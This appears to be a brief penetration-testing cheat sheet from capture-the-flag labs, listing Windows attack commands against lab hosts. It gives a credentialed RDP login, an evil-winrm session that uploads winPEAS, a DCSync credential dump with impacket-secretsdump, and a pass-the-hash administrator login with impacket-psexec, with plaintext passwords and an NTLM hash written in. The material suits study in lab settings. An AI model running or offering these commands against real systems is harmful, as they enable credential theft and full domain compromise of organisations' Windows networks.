# Windows Commands

Used to gain access through RDS.
```
xfreerdp /v:10.10.29.125 /u:thm-unpriv /p:Password321 +clipboard
```

#### Evil-WinRm
```
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

upload ~/windows_programs/winPEASany.exe
```

#### DCSync Attack
```
impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
```

#### Pass-the-Hash attack
```
impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```
